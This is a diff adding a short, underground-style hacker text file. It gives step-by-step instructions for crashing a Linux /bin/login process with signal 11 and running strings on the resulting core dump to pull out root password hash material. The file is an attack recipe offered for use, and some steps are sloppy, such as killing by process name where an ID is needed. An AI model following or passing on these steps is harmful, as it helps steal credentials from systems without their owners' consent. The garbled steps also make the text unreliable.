@@ -1,0 +1,13 @@
+In Linux you can get the part of the passwd file with the cores.
+1)To do this open 2 telnet
+2)on one of the telnet sessions get into your host and type /bin/login
+3)then put as login root and a wrong passwd (you can do this with any account)
+leave it open
+4)on the other telnet session type ps auwx | grep login
+5)check the proccess number and then type kill -11 proccessname
+6)on the other term you should get login: Segmentation fault (core dumped)
+7)on the term you got that type strings core > woah
+that should get ya to the unshadowed porcion of the root login
+
+
+                                                  By InZoMnIaC & FoRmaTeZ
